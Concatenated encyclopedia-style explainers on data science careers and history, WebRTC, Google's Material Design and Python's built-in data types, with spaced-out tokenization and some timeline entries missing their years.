This role becomes redundant with MLaaS ( Machine Learning as a Service ) .
Data Engineer : Develops and manages infrastructure that deals with big data .
Well versed with tools such as Hadoop , NoSQL and MapReduce .
Sets up data pipelines .
Where a data scientist stands out is in her use of ML algorithms , which requires both statistics and computational skills .
A data scientist augments these skills with her ability to deal with large datasets and domain knowledge .
Should a data scientist start with a problem statement or explore available data ?
If you 're new to data science , without much domain knowledge , defining a problem statement can be difficult .
In such a case , you could start with exploratory analysis .
This can then guide you towards asking the right questions .
Given enough data , exploration is likely to yield patterns and correlations .
These could even occur due to measurement errors or data processing artifacts .
But are these findings relevant ?
Asking the right questions and defining a problem statement will give better focus .
Some even claim that lack of a problem definition could lead to disaster because you do n't know what you 're looking for .
What skills must a data scientist have ?
Skills for today 's data scientist .
& copy ; Krzysztof Zawadzki .
Source : CISELab 2018 .
Data scientists are required to be multidisciplinary with knowledge and expertise in statistics , programming , application domain , analytics and communication .
However , unicorns who have all of these are rare .
Often , specializing in a couple of areas with exposure to others is desirable .
Companies do n't rely on a single all - knowing data scientist ; they form a data science team .
A data science team may include the Chief Data Officer , business analyst , data analyst , data scientist , data architect , data engineer and application engineer .
Some of these may be combined in a single person .
For example , a single person may fulfil the roles of data architect and data engineer .
Anyone with strong data and computational abilities can do well as a data scientist .
An essential skill is to turn unstructured data into a form suitable for analysis .
This is not something that a traditional quantitative analyst can do .
Technical skills must be complemented with business acumen , creativity and reasoning .
This will help a data scientist ask relevant questions , assess the suitability of available data and present results the right way .
Should a data scientist learn about cloud computing ?
Data science workflows typically happen on a local computer .
There are , however , scenarios where cloud computing makes sense .
The dataset could be too large for local memory ; or local computational capability is insufficient for the problem ; or the workflow 's output feeds into a larger production environment .
When dealing with large datasets , a data scientist needs to get familiar with cloud technologies , platforms and tools .
This may include storage , running database queries and managing Apache Spark clusters .
As a beginner , what should be my learning path to become a data scientist ?
One approach is to be practical and hands - on from the outset .
Pick a topic about which you 're passionate and curious .
Research available datasets .
Tweet and discuss so that you get clarity .
Start coding .
Explore .
Analyze .
Build data pipelines for large datasets .
Communicate your results .
Repeat this with other datasets and build a public portfolio .
Along the way , pick up all the skills you need .
You may instead prefer a more formal approach .
You can learn the basics of languages such as R and Python .
Follow this with additional packages / libraries , particular to data science : ( R ) dplyr , ggplot2 ; ( Python ) NumPy , Pandas , matplotlib .
Get introduced to statistics .
From this foundation , start your journey into Machine Learning .
To relate these to business goals , some recommend the book Data Science for Business by Provost and Fawcett .
But you should put all this knowledge into practice by taking up projects with datasets and problems that interest you .
At the University of Wisconsin , statistics are covered first before programming .
To become inter - disciplinary , you may choose to learn aspects of data engineering ( data warehousing , Big Data ) and ethics .
Could you give some tips for a budding data scientist ?
The following tips might help : Data science is about answering scientific questions with the help of data .
Do n't focus just on the aspect of handling data , dataset size or the tools .
Understand the business , its products , customers and strategies .
This will help you ask the right questions .
Have constant interaction with business counterparts .
Communicate with them in a language they can understand .
Consider alternative approaches before selecting one that suits the problem .
Likewise , select a suitable metric .
Sometimes derived metrics may yield better predictions compared to available metrics .
Understand the pros and cons of various ML algorithms before selecting one for your problem .
Craft machine learning models from scratch .
Do n't just rely on premade templates and libraries .
Test them to their limits to understand what 's going to work , & where .
Find a compromise between speed and perfection .
On - time delivery should be preferred over extreme accuracy .
Useful data is more important than lots of data .
Use multiple data sources to better understand data and its discrepancies .
Be connected with the data science community , be it via blogs , meetups , conferences or hackathons .
Practice with open datasets .
Learn from the solutions of others .
John W. Tukey publishes " The Future of Data Analysis " .
He explains that statistics has mostly been about making inferences , but his interest is in data analysis , which has more to do with science than mathematics .
The availability of computers makes data analysis possible .
His influential paper is sometimes referred to as FoDA .
The term data science is used for the first time , by Peter Naur in his " Concise Survey of Computer Methods " .
He defines it as the " science of dealing with data " .
His definition does not consider data semantics ( domain knowledge ) .
Thus , it 's different from the modern definition of the term .
An alternative term , datalogy , is also used .
John Chambers at Bell Labs created programming language S. This lays the basis for statistical computing and quantitative programming environments ( QPE ) that use scripts and workflows .
In the 1990s , S inspired the creation of an open source language called R , which is today the dominant QPE .
The International Association for Statistical Computing ( ISAC ) was formed .
This underscores the increasing use of computing in statistical work " to convert data into information and knowledge " .
The same year , John Tukey publishes " Exploratory Data Analysis " where he states that we should use data to form hypotheses to test .
Exploratory Data Analysis and Confirmatory Data Analysis should both be used .
The first Knowledge Discovery in Databases ( KDD ) conference is being held .
By the mid-1990s , this evolved into the ACM SIGKDD Conference on Knowledge Discovery and Data Mining .
Researchers clarify that " KDD refers to the overall process of discovering useful knowledge from data , and data mining refers to a particular step in this process .
Data mining is the application of specific algorithms for extracting patterns from data " .
Professor C. F. Jeff Wu calls for statistics to be renamed data science and statisticians to be renamed data scientists .
The same year , the journal Data Mining and Knowledge Discovery was launched .
William S. Cleveland publishes " Data Science : An Action Plan for Expanding the Technical Areas of the Field of Statistics " .
He proposes the term Data Science in its modern sense .
In Cleveland , a data analyst is good at programming but has limited knowledge of statistics .
A data scientist , on the other hand , comes from a statistics background but has to work more closely with computer specialists .
Leo Breiman publishes " Statistical Modeling : The Two Cultures " .
He compares Generative Modeling with Predictive Modeling .
The former is dominant among statisticians .
Breiman calls them to adopt predictive modeling and algorithms , which have been developed in other fields .
Data Science as a term creates interest thanks to the work of D. J. Patil ( LinkedIn ) and Jeff Hammerbacher ( Facebook ) .
Google 's chief economist , Hal Varian , states that data is plenty but there 's a scarcity of experts who can extract value from it .
The sexy job for the next decade will be statistician .
He states his expectation of a data scientist . The ability to take data — to be able to understand it , to process it , to extract value from it , to visualize it , to communicate it — that ’s going to be a hugely important skill in the next decades .
By the start of this decade , researchers and writers have been attempting to explain data science to the public .
Data scientist is claimed to be the sexiest job of the 21st century .
This decade also sees shifting terminology .
Data Mining is now referred to as Machine Learning .
The work of a data analyst is called Business Intelligence , but when she uses big data it 's called Big Data Analytics .
The University of Michigan announced a $ 100 million Data Science Initiative ( DSI ) to hire 35 new faculty .
Its press release says , " Data science has become a fourth approach to scientific discovery , in addition to experimentation , modeling , and computation .
" Data science hierarchy of needs .
Source : Rogati 2017b .
Monica Rogati puts AI at the top of a pyramid that signifies the data science hierarchy of needs .
She makes the point that companies ca n't have a successful AI strategy without basic data literacy , collection and infrastructure .
It 's also not a good idea to over - engineer the infrastructure .
Instead , build an MVP spanning all layers of the pyramid and then scale horizontally .
WebRTC logo .
Source : WebRTC.org , 2018 .
WebRTC is a technology that brings real - time communications ( RTC ) capabilities to the web by natively making these part of a web browser .
It also adopts open patent - free components to make this technology available to everyone .
For both developers and users , WebRTC lowers the barrier to entry to develop and experience RTC in apps .
WebRTC is expected to enable innovative RTC apps for the web .
WebRTC signalling requires a server to set up the connection .
Once set up , media and other data can be exchanged directly between peers .
Only in some cases when a direct peer - to - peer connection is not possible , another server is needed to relay the media .
Why was the WebRTC invented ?
Voice and video calling is something that only telecom companies provided in the past .
Later , with VoIP , these calls could be delivered over the internet by even non - telecom companies .
Skype , Viber , WhatsApp and WeChat are some examples of voice or video calling services on the internet .
But the problem was that to use them , users needed to download apps or install plug - ins in their web browsers .
For developers , it was difficult to add real - time capabilities to their products and maintain them for different platforms , devices and browsers .
Licensing fees meant that only large corporations could afford them .
WebRTC solves this by embedding real - time communication capabilities into web browsers .
Since web users already have browsers , they need to install anything extra .
Since WebRTC is part of the browser , developers need not build RTC capabilities from scratch .
Developers can focus on building innovative applications powered by WebRTC technology .
More importantly , building apps with RTC capabilities is no longer limited to VoIP experts .
All web developers can get into it .
WebRTC is open and uses no proprietary or patented components .
Thus , even small firms or individuals can get into building WebRTC - based solutions .
How has been the adoption of WebRTC ?
As of January 2018 , WebRTC is supported by many major browsers : Chrome , Firefox , Edge , Safari , iOS Safari , Samsung Internet .
The Object RTC API is supported only by Edge .
Opera supports WebRTC .
On others , such as Internet Explorer , or on older versions of browsers , plugins such as OpenTok can be used .
It 's been said that WebRTC is already in the background and vendors are focusing on delivering effective use cases .
This suggests that WebRTC as a technology is stable and mature .
Among real - world solutions , RBS is using it to give personalized customer service .
Fluke is using it for their remote teams and service staff to collaborate .
Esurance uses it to expedite claims processing .
At scale , Google Meet and Hangouts is serving 4.7 million minutes of audio / video per day .
On Facebook Messenger , 400 million people use voice / video chat a month .
Discord is serving 9.5 billion messages a month .
Amazon Chime for videoconferencing serves 24.8 million minutes a month .
Peer5 is making 1 billion WebRTC connections a day .
What are some use cases of WebRTC ?
Anything that can benefit from media - rich content , can leverage WebRTC : telehealth , remote classroom , online tutoring , remote interviews , online customer service , online collaboration , cloud - based video conferencing , webinars with audience interaction , adding voice / video capability to traditional social / chat apps , multiplayer gaming , and more .
The use of the low - latency data channel leads to more use cases .
By allowing camera access , you can upload your profile picture to a social website .
You could sign into a service biometrically .
You could record an interview and send the video to a recruitment company .
Two devices can get connected directly without needing to trust a server somewhere .
Low - latency broadcasting , peer - assisted data delivery , a web - based torrent client and a streaming media server are more use cases with the data channel .
WebRTC can be part of embedded devices such as set - top boxes , smart TVs , IP cameras , media - streaming dongles , etc .
In other words , WebRTC has a place in the Internet of Things .
Data channels can be used for alerts , collect sensor readings or control devices .
RFC 7478 identifies typical WebRTC use cases and translates them into requirements .
What are the benefits of using WebRTC ?
What WebRTC brings to a web browser .
Source : Levent - Levi , 2012 .
WebRTC is an open standardized browser - based technology free of patents .
Developers can easily enhance their traditional web apps with RTC capabilities .
Browsers that support WebRTC will include APIs to manage peer - to - peer connections , transport layers , media engines and codecs , thus removing most of the complexities for web developers .
It 's also easy to interwork with widely deployed SIP / H.323 systems by adding a gateway or supporting WebRTC .
WebRTC video quality is better than Flash , besides the obvious cost savings in terms of licensing fees .
Latency is reduced .
Connection times are faster when JS WebSockets are used .
Since media is served via a browser , HTML5 can be used for customized UI designs .
Encryption is mandated for all communications including signalling .
TLS , DTLS and SRTP are used to secure communications .
Since it 's part of a browser , the installation process is secure .
Access to a camera or microphone requires explicit user permission .
What 's the protocol stack of WebRTC ?
WebRTC protocol stack .
Source : Grigorik , 2013 , fig .
18 - 3 .
WebRTC uses UDP at the transport layer due to its real - time requirements .
SRTP and SCTP are used at a higher layer to multiplex streams .
For security , DTLS is used .
Because peers can sit behind firewalls and NATs , ICE / STUN / TURN are needed .
For signalling , TLS and TCP are used .
To exchange session parameters , SDP is used .
What are the standards that define WebRTC ?
WebRTC is standardized by two bodies : IETF : IETF specifies formats , protocols and security aspects that enable peer - to - peer WebRTC communications .
This is the transport part , what goes " on the wire .
" Visit WebRTC status page for current status .
W3C : W3C specifies browser APIs that developers can use for their apps .
This is the access and usage part .
Visit the WebRTC status page for current status .
As of January 2018 , the WebRTC 1.0 standard is n't out yet .
Browsers currently implement the proposed APIs with special prefixes .
Meanwhile , Object RTC , which is being referred to as WebRTC 1.1 , uses JS objects to provide low - level control of media parameters .
While such control is possible with SDP , it would require browser changes .
WebRTC does not standardize signalling .
Vendors are free to choose any signalling and there are plenty of options : Socket.io , WebSocket , XHR / XMLHttpRequest , SIP , XMPP or even custom signalling .
Thus , WebRTC does not replace SIP , which is a common myth .
In fact , RFC 7118 talks about SIP over WebSocket , which could be used by WebRTC .
While signalling is not standardized , there 's an IETF draft titled JavaScript Session Establishment Protocol that provides APIs to control the signalling .
Could you describe a typical call flow in WebRTC ?
NAT , STUN and TURN .
Source : Dutton , 2013 .
Participating peers exchange signalling data via a server to setup a direct peer - to - peer connection .
Once such a connection is setup , real - time media traffic is exchanged directly without involving the server .
Since peers often sit behind a firewall or a NAT device , they need to know the public IP address and port of the other peer for direct media exchange .
This is done using the ICE framework .
ICE uses a STUN server to figure out the public addresses and ports of peers .
ICE 's first try for UDP .
If that fails , it attempts to use HTTP over TCP .
If that fails , it attempts HTTPS over TCP .
If STUN succeeds , the media route is direct peer - to - peer .
If direct peer - to - peer is not possible , ICE involves a TURN server .
In this case , media is sent to the TURN server , which simply relays it to the other peer .
STUN servers are typically used for asymmetric NAT and TURN servers for symmetric NAT .
As a developer , what do I need to build a WebRTC - enabled app ?
Your app should call essential WebRTC APIs : ` MediaStream ` : Access content streams from camera and microphone .
A ` MediaStream ` object can contain one or more ` MediaStreamTrack ` objects .
For example , audio is a track and video is another track synchronized to the audio .
The API ` getUserMedia ( ) ` informs what the app requires , obtains user permission and then accesses media streams .
` RTCPeerConnection ` : Gather and exchange local media capabilities and resolve addresses before sending and receiving audio / video content .
` RTCDataChannel ` : Send and receive non - media content , if your app deals with arbitrary data .
You should decide on a method of signalling suited to your app .
You will need a server to handle this signalling to set up peer - to - peer connections .
You will also need to implement the ICE framework along with STUN and TURN servers .
In the case of multiparty calls , you will also need SFUs and MCUs .
If this sounds too complex , you should prefer a platform provider to take care of most server - side stuff : Tokbox , Twilio , Agora.io , Xirsys , Temasys , Kandy , etc .
What metrics should I look at to assess the performance of a WebRTC application ?
The following are some common metrics : Bandwidth : End - to - end bandwidth matters .
Symptoms of low bandwidth include video freezing , frame - rate drops , choppy audio and call drops .
Latency : A latency that 's below 100 ms is usually not noticeable .
High latency affects video more severely than audio .
Symptoms of a high latency connection include lag in playback , video freezing and frame - rate drops .
Loss : Packets are sometimes dropped or lost , particularly on wireless links .
Symptoms include video freezing , frame - rate drops and choppy audio .
In RTC , loss is often preferred over playback lag due to NACKs and retransmissions .
With video , NACKs may be used and when those fail , a full frame is requested , which incurs a high bandwidth cost .
On a congested network , lowering the bitrate is a suitable approach .
Jitter : This is common on high - latency networks or when packets traverse a number of hops .
Symptoms are similar to packet loss , but these symptoms are alleviated when the jitter buffer adapts to network conditions .
Are there any problems or challenges with WebRTC ?
There have been some challenges with WebRTC .
Many enterprises are still using legacy browsers , including Internet Explorer , which do n't support WebRTC .
Multiparty video is a drain on battery and taxes processing power available on laptops or mobiles .
Enterprise deployments are complex and often involve multiple servers that scale very differently .
From a standardization perspective , developers are not happy that Object RTC is being proposed while WebRTC 1.0 has n't been finalized yet .
However , ORTC is an evolution of WebRTC 1.0 and parts of ORTC are already in WebRTC 1.0 .
Another challenge may be that different browsers support different video codecs , leading to interoperability problems .
The idea of WebRTC was born by Google to bring real - time capabilities to the web with built - in support from browsers .
Alternatives at the time were Flash , which was low quality and needed server - side license ; or plug - ins that needed to be developed for various browsers / platforms .
Moreover , users needed to download and install plugins or custom apps .
Real - time communications needs audio / video codecs .
In the spirit of openness on the web , Google released WebM as a patent - free alternative to H.26x codecs .
WebM can be traced back to the work of On2 Technologies that Google acquired in 2009 .
WebRTC uses codecs and media frameworks that are free of patents and royalties .
A one - day workshop was organized to kickoff the standardization process .
Standardization involves IETF to define the formats and protocols , and W3C to define APIs that web apps can use on the browser side .
Google open sources WebRTC under a permissive BSD license .
Thus , the term " WebRTC " often refers to the standard and also the Google 's open source project hosted at webrtc.org .
The Chrome browser adds WebRTC support .
Firefox started supporting WebRTC .
Chrome and Firefox on Android also started supporting WebRTC .
W3C releases WebRTC 1.0 : Real - time Communication Between Browsers as a Candidate Recommendation .
In the year of the COVID-19 pandemic , the use of WebRTC from within the Chrome browser saw a 100X increase .
During this year , Chrome also became 30 % more battery-friendly for video calling .
W3C publishes WebRTC 1.0 : Real - time Communication Between Browsers as a W3C Recommendation .
Beyond what 's been standardized , improvements continue .
Video codec AV1 that saves up to 50 % bandwidth is becoming available in WebRTC implementations .
WebRTC NV is looking into supplementary APIs to enable new use cases .
These are expected to complement 5 G and WebAssembly technologies .
A sample of Material Design components .
Source : https://en.wikipedia.org/wiki/Material_Design#/media/File:Material_Design.svg Material Design is a design system or visual language that enables designers and developers to achieve a unified UI / UX across devices and products .
It 's perhaps Google 's first serious focus on design , rather than technology alone .
By giving app creators design guidelines and tools , Google hopes to bring a consistent experience to users of its products and platforms , especially with Android .
Why " material " ?
Users feel and understand materials .
By making design obey real - world effects at a level of abstraction , the interface will be more natural and intuitive to users .
However , realism is not taken to the extreme like skeuomorphism .
Material Design improves upon flat design by adding real - world effects .
Materials have thickness .
They cast shadows .
They are solid and can not pass through other materials .
They obey the laws of physics .
These have been used in the creation of Material Design .
What 's the backstory for Material Design ?
A comparison of different design philosophies .
Source : Kline , 2015 .
Early human - to - computer interfaces were command line interfaces .
When graphical interfaces were invented in the 1980s , designers attempted to represent real - world objects digitally so that users could relate to icons and buttons due to their familiarity .
Design elements had a sense of realism .
We call this design philosophy skeuomorphism .
As users become tech savvy , such realism is no longer necessary .
Meanwhile , better device displays allowed designers to add more details .
In fact , too much detail can distract users from content and functionality .
UI designs therefore moved towards minimalism that had solid colours , clear typography , no shadows and a functional focus .
This is what we call flat design .
Its roots can be traced to the 1920s and it was later popularized by the Swiss Bauhaus School .
The flat design was adopted by Microsoft Windows 8 ( 2012 ) and Apple 's iOS7 ( 2013 ) .
With the rising popularity of mobile devices , flat design is easier for designers and users across device screen sizes .
Flat design had its critics for causing usability issues and limiting variety .
What if we could combine elements skeuomorphism and flat design ?
Material Design does this by using material as the metaphor .
What are the key principles of Material Design ?
We can identify three key principles : Material is the metaphor : By using shadows and animation , we create surfaces , edges , their relationships and their interactions .
Inspired by materials and objects in the real world , Material Design aims to obey the laws of physics but also go beyond .
Bold , graphic , intentional : The idea is to create an immersive user experience while giving emphasis to user actions and core functionality .
Typography , edge - to - edge imagery ( without margins ) , ample whitespaces and bold colours are just some techniques to achieve this .
Motion provides meaning : Motion must maintain focus and continuity of user experience even as objects transform and reorganize .
It also provides useful feedback on user actions .
User actions are seen as users giving energy to the UI .
Nick Summers has shared more details of the above principles .
What aspects of the interface does Material Design cover ?
Material Design guidelines cover the following ( and more ) : Motion : Duration , guided focus , path of movement , fading , etc .
Style : Colour , icons , imagery , typography , etc .
Layout : Units and measurements , floating action buttons , grids , spacing , layout structure , responsive layout , etc .
Components : Buttons , cards , menus , lists , dividers , tabs , widgets , sliders , etc .
Patterns : Launch screens , navigation , notifications , search , settings , scrolling , etc .
Growth & communications : onboarding , feature discovery , gesture education , etc .
Why does pressing a button make it rise up from the surface ?
A pressed button rises from the surface .
Source : Adapted from https://i.stack.imgur.com / LzOSw.png We normally think of a button as being raised from a surface in default mode .
When pressed , it goes down towards the surface .
In Material Design , buttons behave in the exact opposite manner .
The z - axis property gives a component its elevation with respect to the surface .
The surface is the digital device 's display and components can only rise up ( positive z values ) .
Thus , button press should be seen as a user interacting with the button and making it come towards the finger .
How is motion conveyed ?
Material documentation states , Motion in the world of Material Design is used to describe spatial relationships , functionality , and intention with beauty and fluidity .
Motion is inspired by physics with attention to gravity and friction .
A ripple effect from the point of touch conveys user input .
New surfaces emanate from components that create them .
Transitions happen in arcs .
Surfaces can be pushed , divided or joined with each other .
They can create a hierarchy by interacting and stacking on top of each other with attention to surface thickness .
Materials that grow , shrink or fade do so by decelerating or accelerating in time .
Upward movement starts slow since we have to work against gravity and vice versa for downward movement .
Transformations can originate from an object 's current location or from the center of the final surface .
Materials can move along any axe , but z - movement is meant for user interaction .
What tools has Google released to help designers working on Material Design ?
Apart from design guidelines , Google supports designers with many tools and resources : Gallery : A tool to manage design iterations and get feedback .
Remixer : Collaborate in real - time by adjusting colours , animations and more on the fly .
Resizer : An interactive viewer that helps designers test material design breakpoints across desktop , mobile , and tablet .
Color Tool : Create colour palettes , test accessibility , preview and share .
Device Metrics : A handy reference for sizing your UI across multiple devices .
Stage : Allows for dynamic interfaces with interactive motion .
Icons : A library of hundreds of material icons .
Material Components : Provides modular and customizable Material Design UI components .
It comes in variants of Android , iOS and Web .
Can you give some pointers for using Material Design in Android apps ?
The Android documentation talks about three goals : enchant the user .
Combine beauty and simplicity .
Be crisp and meaningful with typography .
Make life easier .
Make the interface intuitive .
Do n't be overwhelmed .
Amaze the user .
Empower them to try new things and be inventive .
Allow for new workflows .
Muneer gives more descriptions of the above .
Android comes with Material themes , lists , cards , and more .
Shadows and layering can be created by using the Z property ( surface elevation ) .
A variety of material animations can be used out of the box , but developers can also create custom animations .
In addition , a comprehensive Material Design training is available online .
What frameworks out there support Material Design ?
Among the free Material Design CSS frameworks are Materialize , MUI , Surface and Material - UI .
Material Design Lite and Material Components for the Web are frameworks by Google folks .
Google 's Polymer has a category named Paper that includes Material Design components .
Many frameworks add Material Design support for existing front - end frameworks : Viu for Meteor , Vuetify.js for Vue.js , ember - cli - materialize for Ember.js , Ionic Material for Ionic , Material - UI for React , Angular Material and LumX for Angular.js , Material Design for Bootstrap and Phonon Framework for Cordova .
Beyond frameworks , there 's a curated list of 300 + Material Design resources that developers will find useful .
This includes colour palettes , icon sets , fonts , layout templates , UI kits , widgets , backgrounds , wallpapers , articles , design inspirations and more .
Since animation is important in Material Design , Paul Andrew provides a list of animated Material Design examples for inspiration .
Are there any criticisms of Material Design ?
Developers used to flat design , may take more time to implement material design .
They also have to learn and code for motion , which is an important design aspect .
The design language is itself controlled by Google and not open sourced .
Nate Swanner has said that , " Material Design wants to make you feel as though you 're touching something tangible , but you 're not .
You .
Are .
Tapping .
A. Screen .
" He goes on to say that he does n't care about the ' clever ' animations .
Android apps running on iOS tend to use Material Design .
This violates iOS platform conventions and angers iOS users .
Also , a taste of Material Design within iOS is unlikely to influence users to switch to Android .
Rune Madsen gives specific examples of Material Design where Google 's rules of design either constrain designers or simply ignore how designers actually work .
For example , designers should be allowed to use bright colours for body text if they want to .
The design guidelines also tend to enforce a certain style that 's hard to break away from .
Designers will be stuck with Google 's branding .
For that matter , Google itself is not adhering to the Material Design guidelines .
Are there any criticisms of design systems in general ?
A criticism of design systems is that they create a design monoculture .
They also tend to benefit the designer more than the user .
Users will obey a horrible system rather than complain .
In fact , one Google designer stated that , " Material Design is a way for designers to get what they want .
" In 2018 , Google addressed some of this criticism by allowing users to customize the styling while retaining the consistency , usability and discoverability of Material Design .
So it 's not just about design guidelines , but also about tools to adapt to specific design needs and branding .
In contrast , Amazon did not have a well - documented design system .
Rather , it evolved into an effective UI based on user feedback and continuous improvement .
Could you compare Material Design with its alternatives ?
Historically , we 've had skeuomorphism and flat design for digital user interfaces .
Flat design is more performant than skeuomorphism and distraction - free .
But it may look boring and have usability issues .
Skeuomorphism may look too real , distract users from content and render it slow .
Material Design combines the best of both .
It has good documentation but developers may feel constrained by what Google considers as right .
It 's been said that between flat design and material design , the differences are subtle , yet critical .
While Material Design is still flat , it considers the third dimension along the z - axis .
Material Design attempts to bring the real and the digital worlds closer .
It 's richer in interaction and user experience .
IBM Design Language is an alternative that 's been commented as a copy of Material Design .
In 2010 , Microsoft introduced the Metro design language that uses flat design and typography .
An evolution of Metro is Microsoft 's Fluent Design , which was applied to Windows 10 in October 2017 .
Some Google designers attempt to create a unified design across the company 's products and platforms .
It is named Kanna .
The project did n't take off due to lack of management support .
The growth of computer power and broadband access gives UI / UX increasing importance .
Mobile forces design to be taken seriously .
Project Strawman aims to " redesign Google " .
Gmail is redesigned with flatter buttons , and more whitespace and margin .
A year later , Google now uses cards and well - designed typography .
These changes are elements of what later became Material Design .
The new Gmail ( on the right ) after redesign using Material Design .
Source : Adapted from NBC News , 2014 .
Originally codenamed Quantum Paper , Google announces Material Design at its annual developer conference , Google I / O , in San Francisco .
In November 2014 , Android Lollipop became the first Android release to use Material Design .
Faiz Malkani states that Material Design has not achieved the grand unification it hoped for .
He concludes that it can happen only if Material Design sheds the " Google branding " and looks beyond Android .
Material Design gets a new website to bring together guidelines , tools and resources in one place .
Since the spec is a living document , it 's frequently updated .
In 2016 , this is when the last of five updates to Material Design guidelines is released .
Google releases Color Tool for designers working with Material Design .
Designers can create new colour schemes , test accessibility and preview colours with this .
Google is reportedly testing Material Design for its Search , but it appears that only some users are seeing this new layout .
At Google I / O , Google announced that designers could customize material components for their product .
Tools such as Material Theme editor , icon packs and colour palettes enable this .
The idea is to separate functionality from styling so that all apps do n't end up looking the same .
As an example , Google releases GMail with such a customized Material Design .
Python 's type hierarchy .
Source : Пе 2018 .
Among the basic data types and structures in Python are the following : Logical : ` bool ` Numeric : ` int ` , ` float ` , ` complex ` Sequence : ` list ` , ` tuple ` , ` range ` Text Sequence : ` str ` Binary Sequence : ` bytes ` , ` bytearray ` , ` memoryview ` Map : ` dict ` Set : ` set ` , ` frozenset ` All of the above are classes from which object instances can be created .
In addition to the above , more data types / structures are available in modules that come as part of any default Python installation : ` collections ` , ` heapq ` , ` array ` , ` enum ` , etc .
Extra numeric types are available from modules ` numbers ` , ` decimals ` and ` fractions ` .
The built - in function ` type ( ) ` allows us to obtain the type of any object .
With respect to data types , what are the differences between Python2 and Python3 ?
The following are important differences : A division such as ` 5 / 2 ` returns integer value 2 in Python2 due to truncation .
In Python3 , this will evaluate to float value 2.5 even when the input values are only integer .
In Python2 , strings were ASCII .
To use Unicode , one had to use the ` unicode ` type by creating them with a prefix : ` name = u'Saṃsāra ' ` .
In Python3 , the ` str ` type is Unicode by default .
Python2 has ` int ` and ` long ` types but both these are integrated into Python3 as ` int ` .
Integers can be as large as system memory allows .
What data structures in Python are immutable and mutable ?
Mutable objects are those that can be changed after they are created , such as updating / adding / removing an element in a ` list ` .
It can be said that mutable objects are changed in place .
Immutable objects ca n't be changed in place after they are created .
Among the immutable basic data types / structures are ` bool ` , ` int ` , ` float ` , ` complex ` , ` str ` , ` tuple ` , ` range ` , ` frozenset ` , and ` bytes ` .
The mutable counterparts of ` frozenset ` and ` bytes ` are ` set ` and ` bytearray ` respectively .
Among the other mutable data structures are ` list ` and ` dict ` .
With immutable objects , it may seem like we can modify their values by assignment .
What actually happens is that a new immutable object is created and then assigned to the existing variable .
This can be verified by checking the ID ( using ` i d ( ) ` function ) of the variable before and after assignment .
What data structures in Python are suited to handling binary data ?
The core built - in types for manipulating binary data are ` bytes ` and ` bytearray ` .
They are supported by ` memoryview ` , which uses the buffer protocol to access the memory of other binary objects without needing to make a copy .
The ` array ` module supports efficient storage of basic data types like 32-bit integers and IEEE754 double - precision floating values .
Characters , integers and floats can be stored in ` array ` types , which gives low - level access to the bytes that store the data .
What containers and sequences are available in Python ?
List data type and its relation to other types .
Source : Mohan , 2017 .
Containers are data structures that contain one or more objects .
In Python , a container object can contain objects of different types .
For that matter , a container can contain other containers at any depth .
Containers may also be called collections .
Sequences are containers that have inherent ordering among their items .
For example , a string such as ` str = " hello world " ` is a sequence of Unicode characters h , e , l , etc .
Note that there is no character data type in Python , and the expression " h " is actually a 1-character string .
Sequences support two main operations ( eg .
sequence variable ` seq ` ) : Indexing : Access a particular element : ` seq[0 ] ` ( first element ) , ` seq[-1 ] ` ( last element ) .
Slicing : Access a subset of elements with the syntax seq[start : stop : step ] : ` seq[0::2 ] ` ( alternate elements ) , ` seq[0:3 ] ` ( first three elements ) , ` seq[-3 : ] ` ( last three elements ) .
Note that the stop point is not included in the result .
Among the basic sequence types are ` list ` , ` tuple ` , ` range ` , ` str ` , ` bytes ` ` bytearray ` and ` memoryview ` .
Conversely , ` dict ` , ` set ` and ` frozenset ` are simply containers in which elements do n't have any particular order .
More containers are part of the ` collections ` module .
How can I construct some common containers ?
Typical ways to initialize some Python containers .
Source : Atabekov 2019 .
The following examples are self - explanatory : str : ` a = '' ` ( empty ) , ` a = " " ` ( empty ) , ` a = ' Hello ' ` bytes : ` a = b ' ' ` ( empty ) , ` a = b " " ` ( empty ) , ` a = b'Hello ' ` list : ` a = list ( ) ` ( empty ) , ` a = [ ] ` ( empty ) , ` a = [ 1 , 2 , 3 ] ` tuple : ` a = tuple ( ) ` ( empty ) , ` a = ( 1 , ) ` ( single item ) , ` a = ( 1 , 2 , 3 ) ` , ` a = 1 , 2 , 3 ` set : ` a = set ( ) ` ( empty ) , ` a = { 1 , 2 , 3 } ` dict : ` a = dict ( ) ` ( empty ) , ` a = { } ` ( empty ) , ` a = { 1:2 , 2:4 , 3:9 } ` We can construct ` bytearray ` from ` bytes ` and ` frozenset ` from ` set ` using their respective built - in functions .
What are iterables and iterators ?
An iterable is a container that can be processed element by element .
For sequences , elements are processed in the order they are stored .
For non - sequences , elements are processed in some arbitrary order .
Formally , any object that implements the iterator protocol is an iterable .
The iterator protocol is defined by two special methods , ` & lowbar;&lowbar;iter&lowbar;&lowbar ; ( ) ` and ` & lowbar;&lowbar;next&lowbar;&lowbar ; ( ) ` .
Calling ` iter ( ) ` on an iterable returns what is called an iterator .
Calling ` next ( ) ` on an iterator gives us the next element of the iterable .
Thus , iterators help us process the iterable element by element .
When we use loops or comprehensions in Python , iterators are used under the hood .
Programmers do n't need to call ` iter ( ) ` or ` next ( ) ` explicitly .
Can I convert from one data type to another ?
Yes , provided they are compatible .
Here are some examples : ` int('3 ' ) ` will convert from string to integer ` int(3.4 ) ` will truncate float to integer ` bool(0 ) ` and ` bool ( [ ] ) ` will both return ` False ` ` ord('A ' ) ` will return the equivalent Unicode code point as an integer value ` chr(65 ) ` will return the equivalent Unicode string of one character ` bin(100 ) ` , ` oct(100 ) ` and ` hex(100 ) ` will return string representations in their respective bases ` int('45 ' , 16 ) ` and ` int('0x45 ' , 16 ) ` will convert from hexadecimal to decimal ` tuple([1 , 2 , 3 ] ) ` will convert from list to tuple ` list('hello ' ) ` will split the string into a list of 1-character strings ` set([1 , 1 , 2 , 3 ] ) ` will remove duplicates in the list to give a set ` dict([(1,2 ) , ( 2,4 ) , ( 3,9 ) ] ) ` will construct a dictionary from the given list of tuples ` list({1:2 , 2:4 , 3:9 } ) ` will return a list based on the dictionary keys .
Should I use a list or a tuple ?
Complexity of list operations .
Source : PCA 2018 .
Tuples are used to pass arguments and return results from functions .
This is because they can contain multiple elements and are immutable .
Tuples are also good for storing closely related data .
For example , ( x , y , z ) coordinates or ( r , g , b ) colour components can be stored as tuples .
Use lists instead if values can change during the lifetime of the object .
Although lists can contain heterogeneous items , tuples are more commonly used for this purpose .
Tuples group together items that belong together even if their types are different .
A database record containing a student 's details can be stored in a tuple .
If a sequence is to be sorted , use a list for in - place sorting .
A tuple can be used , but it should return a new sorted object .
A tuple can not be sorted in place .
For better code readability , elements of a tuple can be named .
